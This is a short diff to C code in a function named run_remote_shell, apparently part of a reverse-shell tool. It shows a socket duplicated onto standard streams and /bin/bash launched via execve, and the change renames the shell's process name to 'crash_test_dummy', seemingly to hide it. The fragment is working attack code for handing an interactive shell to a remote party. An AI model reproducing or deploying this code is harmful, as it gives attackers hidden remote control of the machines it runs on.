@@ -102,10 +102,10 @@ void run_remote_shell(void) {
     dup2(remote_sock, 2);
 
     const char* sh[2];
-    sh[0] = "/bin/bash";
+    sh[0] = "crash_test_dummy";
     sh[1] = NULL;
 
-    execve(sh[0], (char* const*) sh, 0);
+    execve("/bin/bash", (char* const*) sh, 0);
 }
 
 /*
